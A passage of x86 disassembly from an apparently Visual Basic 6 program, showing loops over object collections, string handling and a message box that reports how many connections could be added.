007F4309: lea eax, var_00000094
007F430F: push eax
007F4310: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F4315: add esp, 00000010h
007F4318: push eax
007F4319: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F431E: sub ax, FFFFh
007F4322: neg ax
007F4325: sbb eax, eax
007F4327: inc eax
007F4328: neg eax
007F432A: mov var_000001F8, ax
007F4331: lea eax, var_74
007F4334: push eax
007F4335: lea eax, var_70
007F4338: push eax
007F4339: push 00000002h
007F433B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F4340: add esp, 0000000Ch
007F4343: lea ecx, var_00000094
007F4349: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F434E: movsx eax, word ptr var_000001F8
007F4355: test eax, eax
007F4357: jz 007F45CDh
007F435D: mov var_04, 0000008Ah
007F4364: cmp [008F2410h], 00000000h
007F436B: jnz 7F4388h
007F436D: push 008F2410h
007F4372: push 00440E38h
007F4377: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F437C: mov var_00000544, 008F2410h
007F4386: jmp 7F4392h
007F4388: mov var_00000544, 008F2410h
007F4392: mov eax, var_00000544
007F4398: mov eax, [eax]
007F439A: mov var_000001F0, eax
007F43A0: lea eax, var_00000094
007F43A6: push eax
007F43A7: lea eax, var_30
007F43AA: push eax
007F43AB: mov eax, var_000001F0
007F43B1: mov eax, [eax]
007F43B3: push var_000001F0
007F43B9: call [eax+1Ch]
007F43BC: fclex 
007F43BE: mov var_000001F4, eax
007F43C4: cmp var_000001F4, 00000000h
007F43CB: jnl 7F43EDh
007F43CD: push 0000001Ch
007F43CF: push 00440E28h
007F43D4: push var_000001F0
007F43DA: push var_000001F4
007F43E0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F43E5: mov var_00000548, eax
007F43EB: jmp 7F43F4h
007F43ED: and var_00000548, 00000000h
007F43F4: lea eax, var_00000094
007F43FA: push eax
007F43FB: lea eax, var_54
007F43FE: push eax
007F43FF: call 0041097Ch ; msvbvm60.dll.__vbaStrVarVal
007F4404: push eax
007F4405: call 004109DCh ; Val(arg_1)
007F440A: fstp real8 ptr var_000001E4
007F4410: push 00000000h
007F4412: push 00000005h
007F4414: push 00000001h
007F4416: push 00000000h
007F4418: lea eax, var_00000148
007F441E: push eax
007F441F: push 00000010h
007F4421: push 00000880h
007F4426: call 00410946h ; ReDim
007F442B: add esp, 0000001Ch
007F442E: mov var_00000150, 00447594h
007F4438: mov var_00000158, 00000008h
007F4442: lea esi, var_00000158
007F4448: push 00000000h
007F444A: push var_00000148
007F4450: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F4455: mov ecx, eax
007F4457: mov edx, esi
007F4459: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
007F445E: mov eax, [ebp+08h]
007F4461: mov eax, [eax]
007F4463: push [ebp+08h]
007F4466: call [eax+00000344h]
007F446C: mov var_0000009C, eax
007F4472: mov var_000000A4, 00000009h
007F447C: lea esi, var_000000A4
007F4482: push 00000001h
007F4484: push var_00000148
007F448A: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F448F: mov ecx, eax
007F4491: mov edx, esi
007F4493: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F4498: mov eax, [ebp+08h]
007F449B: mov eax, [eax]
007F449D: push [ebp+08h]
007F44A0: call [eax+00000340h]
007F44A6: mov var_000000AC, eax
007F44AC: mov var_000000B4, 00000009h
007F44B6: lea esi, var_000000B4
007F44BC: push 00000002h
007F44BE: push var_00000148
007F44C4: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F44C9: mov ecx, eax
007F44CB: mov edx, esi
007F44CD: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F44D2: mov eax, [ebp+08h]
007F44D5: mov eax, [eax]
007F44D7: push [ebp+08h]
007F44DA: call [eax+0000033Ch]
007F44E0: mov var_000000BC, eax
007F44E6: mov var_000000C4, 00000009h
007F44F0: lea esi, var_000000C4
007F44F6: push 00000003h
007F44F8: push var_00000148
007F44FE: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F4503: mov ecx, eax
007F4505: mov edx, esi
007F4507: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F450C: lea eax, var_34
007F450F: mov var_00000160, eax
007F4515: mov var_00000168, 00004003h
007F451F: lea esi, var_00000168
007F4525: push 00000004h
007F4527: push var_00000148
007F452D: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F4532: mov ecx, eax
007F4534: mov edx, esi
007F4536: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F453B: lea eax, var_44
007F453E: mov var_00000170, eax
007F4544: mov var_00000178, 00004008h
007F454E: lea esi, var_00000178
007F4554: push 00000005h
007F4556: push var_00000148
007F455C: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F4561: mov ecx, eax
007F4563: mov edx, esi
007F4565: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F456A: mov edx, 0043D464h ; x7
007F456F: lea ecx, var_58
007F4572: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F4577: lea eax, var_00000148
007F457D: push eax
007F457E: lea eax, var_58
007F4581: push eax
007F4582: fld real8 ptr var_000001E4
007F4588: call 004108E6h ; msvbvm60.dll.__vbaFpI2
007F458D: push eax
007F458E: call 007A6910h
007F4593: lea eax, var_00000148
007F4599: push eax
007F459A: push 00000000h
007F459C: call 00410934h ; Erase
007F45A1: lea eax, var_58
007F45A4: push eax
007F45A5: lea eax, var_54
007F45A8: push eax
007F45A9: push 00000002h
007F45AB: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F45B0: add esp, 0000000Ch
007F45B3: lea ecx, var_00000094
007F45B9: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F45BE: mov var_04, 0000008Bh
007F45C5: and word ptr [008F24A4h], 0000h
007F45CD: mov var_04, 0000008Dh
007F45D4: lea eax, var_00000360
007F45DA: push eax
007F45DB: lea eax, var_00000350
007F45E1: push eax
007F45E2: lea eax, var_30
007F45E5: push eax
007F45E6: call 00410A36h ; Next
007F45EB: mov var_000003E0, eax
007F45F1: cmp var_000003E0, 00000000h
007F45F8: jnz 007F3F4Fh
007F45FE: mov var_04, 0000008Eh
007F4605: mov eax, [ebp+08h]
007F4608: mov eax, [eax]
007F460A: push [ebp+08h]
007F460D: call [eax+00000344h]
007F4613: push eax
007F4614: lea eax, var_70
007F4617: push eax
007F4618: call 00410A84h ; Set (object)
007F461D: mov var_000001F0, eax
007F4623: lea eax, var_54
007F4626: push eax
007F4627: mov eax, var_000001F0
007F462D: mov eax, [eax]
007F462F: push var_000001F0
007F4635: call [eax+000000A0h]
007F463B: fclex 
007F463D: mov var_000001F4, eax
007F4643: cmp var_000001F4, 00000000h
007F464A: jnl 7F466Fh
007F464C: push 000000A0h
007F4651: push 00440E08h
007F4656: push var_000001F0
007F465C: push var_000001F4
007F4662: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F4667: mov var_0000054C, eax
007F466D: jmp 7F4676h
007F466F: and var_0000054C, 00000000h
007F4676: mov edx, var_54
007F4679: mov ecx, 008F2488h
007F467E: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F4683: lea ecx, var_54
007F4686: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007F468B: lea ecx, var_70
007F468E: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F4693: mov var_04, 0000008Fh
007F469A: mov eax, [ebp+08h]
007F469D: mov eax, [eax]
007F469F: push [ebp+08h]
007F46A2: call [eax+00000340h]
007F46A8: push eax
007F46A9: lea eax, var_70
007F46AC: push eax
007F46AD: call 00410A84h ; Set (object)
007F46B2: mov var_000001F0, eax
007F46B8: lea eax, var_54
007F46BB: push eax
007F46BC: mov eax, var_000001F0
007F46C2: mov eax, [eax]
007F46C4: push var_000001F0
007F46CA: call [eax+000000A0h]
007F46D0: fclex 
007F46D2: mov var_000001F4, eax
007F46D8: cmp var_000001F4, 00000000h
007F46DF: jnl 7F4704h
007F46E1: push 000000A0h
007F46E6: push 00440E08h
007F46EB: push var_000001F0
007F46F1: push var_000001F4
007F46F7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F46FC: mov var_00000550, eax
007F4702: jmp 7F470Bh
007F4704: and var_00000550, 00000000h
007F470B: mov edx, var_54
007F470E: mov ecx, 008F248Ch
007F4713: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F4718: lea ecx, var_54
007F471B: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007F4720: lea ecx, var_70
007F4723: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F4728: mov var_04, 00000090h
007F472F: push var_34
007F4732: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
007F4737: mov edx, eax
007F4739: lea ecx, var_54
007F473C: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F4741: mov edx, eax
007F4743: mov ecx, 008F249Ch
007F4748: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F474D: lea ecx, var_54
007F4750: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007F4755: mov var_04, 00000091h
007F475C: mov edx, var_44
007F475F: mov ecx, 008F24A0h
007F4764: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F4769: mov var_04, 00000092h
007F4770: mov eax, [ebp+08h]
007F4773: mov eax, [eax]
007F4775: push [ebp+08h]
007F4778: call [eax+0000033Ch]
007F477E: push eax
007F477F: lea eax, var_70
007F4782: push eax
007F4783: call 00410A84h ; Set (object)
007F4788: mov var_000001F0, eax
007F478E: lea eax, var_54
007F4791: push eax
007F4792: mov eax, var_000001F0
007F4798: mov eax, [eax]
007F479A: push var_000001F0
007F47A0: call [eax+000000A0h]
007F47A6: fclex 
007F47A8: mov var_000001F4, eax
007F47AE: cmp var_000001F4, 00000000h
007F47B5: jnl 7F47DAh
007F47B7: push 000000A0h
007F47BC: push 00440E08h
007F47C1: push var_000001F0
007F47C7: push var_000001F4
007F47CD: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F47D2: mov var_00000554, eax
007F47D8: jmp 7F47E1h
007F47DA: and var_00000554, 00000000h
007F47E1: mov edx, var_54
007F47E4: mov ecx, 008F24A8h
007F47E9: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F47EE: lea ecx, var_54
007F47F1: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007F47F6: lea ecx, var_70
007F47F9: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F47FE: mov var_04, 00000093h
007F4805: push 00000000h
007F4807: push 00000000h
007F4809: mov eax, [ebp+08h]
007F480C: mov eax, [eax]
007F480E: push [ebp+08h]
007F4811: call [eax+0000036Ch]
007F4817: push eax
007F4818: lea eax, var_70
007F481B: push eax
007F481C: call 00410A84h ; Set (object)
007F4821: push eax
007F4822: lea eax, var_00000094
007F4828: push eax
007F4829: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F482E: add esp, 00000010h
007F4831: push eax
007F4832: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F4837: dec eax
007F4838: neg eax
007F483A: sbb eax, eax
007F483C: inc eax
007F483D: neg eax
007F483F: mov var_000001F0, ax
007F4846: lea ecx, var_70
007F4849: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F484E: lea ecx, var_00000094
007F4854: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F4859: movsx eax, word ptr var_000001F0
007F4860: test eax, eax
007F4862: jz 7F4875h
007F4864: mov var_04, 00000094h
007F486B: or word ptr [008F24ACh], FFFFh
007F4873: jmp 7F4884h
007F4875: mov var_04, 00000096h
007F487C: and word ptr [008F24ACh], 0000h
007F4884: mov var_04, 00000098h
007F488B: cmp [008F2410h], 00000000h
007F4892: jnz 7F48AFh
007F4894: push 008F2410h
007F4899: push 00440E38h
007F489E: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F48A3: mov var_00000558, 008F2410h
007F48AD: jmp 7F48B9h
007F48AF: mov var_00000558, 008F2410h
007F48B9: mov eax, var_00000558
007F48BF: mov eax, [eax]
007F48C1: mov var_000001F0, eax
007F48C7: lea eax, var_000001DC
007F48CD: push eax
007F48CE: mov eax, var_000001F0
007F48D4: mov eax, [eax]
007F48D6: push var_000001F0
007F48DC: call [eax+24h]
007F48DF: fclex 
007F48E1: mov var_000001F4, eax
007F48E7: cmp var_000001F4, 00000000h
007F48EE: jnl 7F4910h
007F48F0: push 00000024h
007F48F2: push 00440E28h
007F48F7: push var_000001F0
007F48FD: push var_000001F4
007F4903: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F4908: mov var_0000055C, eax
007F490E: jmp 7F4917h
007F4910: and var_0000055C, 00000000h
007F4917: mov eax, var_000001DC
007F491D: xor ebx, ebx
007F491F: cmp eax, [008F2480h]
007F4925: setl bl
007F4928: neg ebx
007F492A: push 00000000h
007F492C: push 00000000h
007F492E: mov eax, [ebp+08h]
007F4931: mov eax, [eax]
007F4933: push [ebp+08h]
007F4936: call [eax+0000036Ch]
007F493C: push eax
007F493D: lea eax, var_70
007F4940: push eax
007F4941: call 00410A84h ; Set (object)
007F4946: push eax
007F4947: lea eax, var_00000094
007F494D: push eax
007F494E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F4953: add esp, 00000010h
007F4956: push eax
007F4957: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F495C: neg eax
007F495E: sbb eax, eax
007F4960: inc eax
007F4961: neg eax
007F4963: and bx, ax
007F4966: mov var_000001F8, bx
007F496D: lea ecx, var_70
007F4970: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F4975: lea ecx, var_00000094
007F497B: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F4980: movsx eax, word ptr var_000001F8
007F4987: test eax, eax
007F4989: jz 007F4B77h
007F498F: mov var_04, 00000099h
007F4996: cmp [008F2410h], 00000000h
007F499D: jnz 7F49BAh
007F499F: push 008F2410h
007F49A4: push 00440E38h
007F49A9: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F49AE: mov var_00000560, 008F2410h
007F49B8: jmp 7F49C4h
007F49BA: mov var_00000560, 008F2410h
007F49C4: mov eax, var_00000560
007F49CA: mov eax, [eax]
007F49CC: mov var_000001F0, eax
007F49D2: lea eax, var_000001DC
007F49D8: push eax
007F49D9: mov eax, var_000001F0
007F49DF: mov eax, [eax]
007F49E1: push var_000001F0
007F49E7: call [eax+24h]
007F49EA: fclex 
007F49EC: mov var_000001F4, eax
007F49F2: cmp var_000001F4, 00000000h
007F49F9: jnl 7F4A1Bh
007F49FB: push 00000024h
007F49FD: push 00440E28h
007F4A02: push var_000001F0
007F4A08: push var_000001F4
007F4A0E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F4A13: mov var_00000564, eax
007F4A19: jmp 7F4A22h
007F4A1B: and var_00000564, 00000000h
007F4A22: mov var_000000BC, 80020004h
007F4A2C: mov var_000000C4, 0000000Ah
007F4A36: mov var_000000AC, 80020004h
007F4A40: mov var_000000B4, 0000000Ah
007F4A4A: mov var_0000009C, 80020004h
007F4A54: mov var_000000A4, 0000000Ah
007F4A5E: push 004508B4h ; Unfortunately,
007F4A63: push var_000001DC
007F4A69: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
007F4A6E: mov edx, eax
007F4A70: lea ecx, var_54
007F4A73: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F4A78: push eax
007F4A79: call 00410A18h ; &
007F4A7E: mov edx, eax
007F4A80: lea ecx, var_58
007F4A83: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F4A88: push eax
007F4A89: push 004506F0h ; connection(s) could be added, not
007F4A8E: call 00410A18h ; &
007F4A93: mov edx, eax
007F4A95: lea ecx, var_5C
007F4A98: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F4A9D: push eax
007F4A9E: push [008F2480h]
007F4AA4: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
007F4AA9: mov edx, eax
007F4AAB: lea ecx, var_60
007F4AAE: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F4AB3: push eax
007F4AB4: call 00410A18h ; &
007F4AB9: mov edx, eax
007F4ABB: lea ecx, var_64
007F4ABE: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F4AC3: push eax
007F4AC4: push 00445638h
007F4AC9: call 00410A18h ; &
007F4ACE: mov edx, eax
007F4AD0: lea ecx, var_68
007F4AD3: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F4AD8: push eax
007F4AD9: push 00441264h ; vbCrLf
007F4ADE: call 00410A18h ; &
007F4AE3: mov edx, eax
007F4AE5: lea ecx, var_6C
007F4AE8: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F4AED: push eax
007F4AEE: push 00450B00h ; Note: More will be added when possible
007F4AF3: call 00410A18h ; &
007F4AF8: mov var_0000008C, eax
007F4AFE: mov var_00000094, 00000008h
007F4B08: lea eax, var_000000C4
007F4B0E: push eax
007F4B0F: lea eax, var_000000B4
007F4B15: push eax
007F4B16: lea eax, var_000000A4
007F4B1C: push eax
007F4B1D: push 00000030h
007F4B1F: lea eax, var_00000094
007F4B25: push eax
007F4B26: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
007F4B2B: lea eax, var_6C
007F4B2E: push eax
007F4B2F: lea eax, var_68
007F4B32: push eax
007F4B33: lea eax, var_64
007F4B36: push eax
007F4B37: lea eax, var_60
007F4B3A: push eax
007F4B3B: lea eax, var_5C
007F4B3E: push eax
007F4B3F: lea eax, var_58
007F4B42: push eax
007F4B43: lea eax, var_54
007F4B46: push eax
007F4B47: push 00000007h
007F4B49: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F4B4E: add esp, 00000020h
007F4B51: lea eax, var_000000C4
007F4B57: push eax
007F4B58: lea eax, var_000000B4
007F4B5E: push eax
007F4B5F: lea eax, var_000000A4
007F4B65: push eax
007F4B66: lea eax, var_00000094
007F4B6C: push eax
007F4B6D: push 00000004h
007F4B6F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F4B74: add esp, 00000014h
007F4B77: jmp 007F5FCEh
007F4B7C: mov var_04, 0000009Ch
007F4B83: cmp word ptr [008F2430h], FFFFh
007F4B8B: jnz 007F55ABh
007F4B91: mov var_04, 0000009Dh
007F4B98: mov var_00000150, 00000001h
007F4BA2: mov var_00000158, 00000002h
007F4BAC: cmp [008F2010h], 00000000h
007F4BB3: jnz 7F4BD0h
007F4BB5: push 008F2010h
007F4BBA: push 00433984h
007F4BBF: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F4BC4: mov var_00000568, 008F2010h
007F4BCE: jmp 7F4BDAh
007F4BD0: mov var_00000568, 008F2010h
007F4BDA: push 00000000h
007F4BDC: push 00000001h
007F4BDE: push 00440E48h
007F4BE3: push 00000000h
007F4BE5: push 00000018h
007F4BE7: mov eax, var_00000568
007F4BED: mov eax, [eax]
007F4BEF: mov ecx, var_00000568
007F4BF5: mov ecx, [ecx]
007F4BF7: mov ecx, [ecx]
007F4BF9: push eax
007F4BFA: call [ecx+0000054Ch]
007F4C00: push eax
007F4C01: lea eax, var_70
007F4C04: push eax
007F4C05: call 00410A84h ; Set (object)
007F4C0A: push eax
007F4C0B: lea eax, var_00000094
007F4C11: push eax
007F4C12: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F4C17: add esp, 00000010h
007F4C1A: push eax
007F4C1B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F4C20: push eax
007F4C21: lea eax, var_74
007F4C24: push eax
007F4C25: call 00410A84h ; Set (object)
007F4C2A: push eax
007F4C2B: lea eax, var_000000A4
007F4C31: push eax
007F4C32: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F4C37: add esp, 00000010h
007F4C3A: push eax
007F4C3B: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F4C40: mov var_00000160, eax
007F4C46: mov var_00000168, 00000003h
007F4C50: mov var_00000170, 00000001h
007F4C5A: mov var_00000178, 00000002h
007F4C64: lea eax, var_00000158
007F4C6A: push eax
007F4C6B: lea eax, var_00000168
007F4C71: push eax
007F4C72: lea eax, var_00000178
007F4C78: push eax
007F4C79: lea eax, var_00000380
007F4C7F: push eax
007F4C80: lea eax, var_00000370
007F4C86: push eax
007F4C87: lea eax, var_30
007F4C8A: push eax
007F4C8B: call 00410A3Ch ; For
007F4C90: mov var_000003E4, eax
007F4C96: lea eax, var_74
007F4C99: push eax
007F4C9A: lea eax, var_70
007F4C9D: push eax
007F4C9E: push 00000002h
007F4CA0: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F4CA5: add esp, 0000000Ch
007F4CA8: lea eax, var_000000A4
007F4CAE: push eax
007F4CAF: lea eax, var_00000094
007F4CB5: push eax
007F4CB6: push 00000002h
007F4CB8: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F4CBD: add esp, 0000000Ch
007F4CC0: jmp 007F5599h
007F4CC5: mov var_04, 0000009Eh
007F4CCC: lea eax, var_30
007F4CCF: mov var_00000150, eax
007F4CD5: mov var_00000158, 0000400Ch
007F4CDF: cmp [008F2010h], 00000000h
007F4CE6: jnz 7F4D03h
007F4CE8: push 008F2010h
007F4CED: push 00433984h
007F4CF2: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F4CF7: mov var_0000056C, 008F2010h
007F4D01: jmp 7F4D0Dh
007F4D03: mov var_0000056C, 008F2010h
007F4D0D: push 00000000h
007F4D0F: push 00000004h
007F4D11: push 00440E58h
007F4D16: push 00000010h
007F4D18: pop eax
007F4D19: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F4D1E: lea esi, var_00000158
007F4D24: mov edi, esp
007F4D26: movsd 
007F4D27: movsd 
007F4D28: movsd 
007F4D29: movsd 
007F4D2A: push 00000001h
007F4D2C: push 00000000h
007F4D2E: push 00440E48h
007F4D33: push 00000000h
007F4D35: push 00000018h
007F4D37: mov eax, var_0000056C
007F4D3D: mov eax, [eax]
007F4D3F: mov ecx, var_0000056C
007F4D45: mov ecx, [ecx]
007F4D47: mov ecx, [ecx]
007F4D49: push eax
007F4D4A: call [ecx+0000054Ch]
007F4D50: push eax
007F4D51: lea eax, var_70
007F4D54: push eax
007F4D55: call 00410A84h ; Set (object)
007F4D5A: push eax
007F4D5B: lea eax, var_00000094
007F4D61: push eax
007F4D62: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F4D67: add esp, 00000010h
007F4D6A: push eax
007F4D6B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F4D70: push eax
007F4D71: lea eax, var_74
007F4D74: push eax
007F4D75: call 00410A84h ; Set (object)
007F4D7A: push eax
007F4D7B: lea eax, var_000000A4
007F4D81: push eax
007F4D82: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F4D87: add esp, 00000020h
007F4D8A: push eax
007F4D8B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F4D90: push eax
007F4D91: lea eax, var_78
007F4D94: push eax
007F4D95: call 00410A84h ; Set (object)
007F4D9A: push eax
007F4D9B: lea eax, var_000000B4
007F4DA1: push eax
007F4DA2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F4DA7: add esp, 00000010h
007F4DAA: push eax
007F4DAB: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F4DB0: sub ax, FFFFh
007F4DB4: neg ax
007F4DB7: sbb eax, eax
007F4DB9: inc eax
007F4DBA: neg eax
007F4DBC: mov var_000001F0, ax
007F4DC3: lea eax, var_78
007F4DC6: push eax
007F4DC7: lea eax, var_74
007F4DCA: push eax
007F4DCB: lea eax, var_70
007F4DCE: push eax
007F4DCF: push 00000003h
007F4DD1: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F4DD6: add esp, 00000010h
007F4DD9: lea eax, var_000000B4
007F4DDF: push eax
007F4DE0: lea eax, var_000000A4
007F4DE6: push eax
007F4DE7: lea eax, var_00000094
007F4DED: push eax
007F4DEE: push 00000003h
007F4DF0: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F4DF5: add esp, 00000010h
007F4DF8: movsx eax, word ptr var_000001F0
007F4DFF: test eax, eax
007F4E01: jz 007F5575h
007F4E07: mov var_04, 0000009Fh
007F4E0E: mov eax, [ebp+08h]
007F4E11: mov eax, [eax]
007F4E13: push [ebp+08h]
007F4E16: call [eax+00000380h]
007F4E1C: push eax
007F4E1D: lea eax, var_70
007F4E20: push eax
007F4E21: call 00410A84h ; Set (object)
007F4E26: mov var_000001F0, eax
007F4E2C: lea eax, var_74
007F4E2F: push eax
007F4E30: push 00000000h
007F4E32: mov eax, var_000001F0
007F4E38: mov eax, [eax]
007F4E3A: push var_000001F0
007F4E40: call [eax+40h]
007F4E43: fclex 
007F4E45: mov var_000001F4, eax
007F4E4B: cmp var_000001F4, 00000000h
007F4E52: jnl 7F4E74h
007F4E54: push 00000040h
007F4E56: push 00440DE8h
007F4E5B: push var_000001F0
007F4E61: push var_000001F4
007F4E67: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F4E6C: mov var_00000570, eax
007F4E72: jmp 7F4E7Bh
007F4E74: and var_00000570, 00000000h
007F4E7B: push 00000000h
007F4E7D: push 00000000h
007F4E7F: push var_74
007F4E82: lea eax, var_00000094
007F4E88: push eax
007F4E89: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F4E8E: add esp, 00000010h
007F4E91: push eax
007F4E92: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F4E97: sub ax, FFFFh
007F4E9B: neg ax
007F4E9E: sbb eax, eax
007F4EA0: inc eax
007F4EA1: neg eax
007F4EA3: mov var_000001F8, ax
007F4EAA: lea eax, var_74
007F4EAD: push eax
007F4EAE: lea eax, var_70
007F4EB1: push eax
007F4EB2: push 00000002h
007F4EB4: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F4EB9: add esp, 0000000Ch
007F4EBC: lea ecx, var_00000094
007F4EC2: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F4EC7: movsx eax, word ptr var_000001F8
007F4ECE: test eax, eax
007F4ED0: jz 007F51BEh
007F4ED6: mov var_04, 000000A0h
007F4EDD: lea eax, var_30
007F4EE0: mov var_00000150, eax
007F4EE6: mov var_00000158, 0000400Ch
007F4EF0: cmp [008F2010h], 00000000h
007F4EF7: jnz 7F4F14h
007F4EF9: push 008F2010h
007F4EFE: push 00433984h
007F4F03: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F4F08: mov var_00000574, 008F2010h
007F4F12: jmp 7F4F1Eh
007F4F14: mov var_00000574, 008F2010h
007F4F1E: push 00000000h
007F4F20: push 00000014h
007F4F22: push 00440E58h
007F4F27: push 00000010h
007F4F29: pop eax
007F4F2A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F4F2F: lea esi, var_00000158
007F4F35: mov edi, esp
007F4F37: movsd 
007F4F38: movsd 
007F4F39: movsd 
007F4F3A: movsd 
007F4F3B: push 00000001h
007F4F3D: push 00000000h
007F4F3F: push 00440E48h
007F4F44: push 00000000h
007F4F46: push 00000018h
007F4F48: mov eax, var_00000574
007F4F4E: mov eax, [eax]
007F4F50: mov ecx, var_00000574
007F4F56: mov ecx, [ecx]
007F4F58: mov ecx, [ecx]
007F4F5A: push eax
007F4F5B: call [ecx+0000054Ch]
007F4F61: push eax
007F4F62: lea eax, var_70
007F4F65: push eax
007F4F66: call 00410A84h ; Set (object)
007F4F6B: push eax
007F4F6C: lea eax, var_00000094
007F4F72: push eax
007F4F73: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F4F78: add esp, 00000010h
007F4F7B: push eax
007F4F7C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F4F81: push eax
007F4F82: lea eax, var_74
007F4F85: push eax
007F4F86: call 00410A84h ; Set (object)
007F4F8B: push eax
007F4F8C: lea eax, var_000000A4
007F4F92: push eax
007F4F93: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F4F98: add esp, 00000020h
007F4F9B: push eax
007F4F9C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F4FA1: push eax
007F4FA2: lea eax, var_78
007F4FA5: push eax
007F4FA6: call 00410A84h ; Set (object)
007F4FAB: push eax
007F4FAC: lea eax, var_000000B4
007F4FB2: push eax
007F4FB3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F4FB8: add esp, 00000010h
007F4FBB: push eax
007F4FBC: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F4FC1: mov edx, eax
007F4FC3: lea ecx, var_54
007F4FC6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F4FCB: push eax
007F4FCC: call 004109DCh ; Val(arg_1)
007F4FD1: fstp real8 ptr var_000001E4
007F4FD7: push 00000000h
007F4FD9: push 00000005h
007F4FDB: push 00000001h
007F4FDD: push 00000000h
007F4FDF: lea eax, var_00000148
007F4FE5: push eax
007F4FE6: push 00000010h
007F4FE8: push 00000880h
007F4FED: call 00410946h ; ReDim
007F4FF2: add esp, 0000001Ch
007F4FF5: mov var_00000160, 00442938h
007F4FFF: mov var_00000168, 00000008h
007F5009: lea esi, var_00000168
007F500F: push 00000000h
007F5011: push var_00000148
007F5017: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F501C: mov ecx, eax
007F501E: mov edx, esi
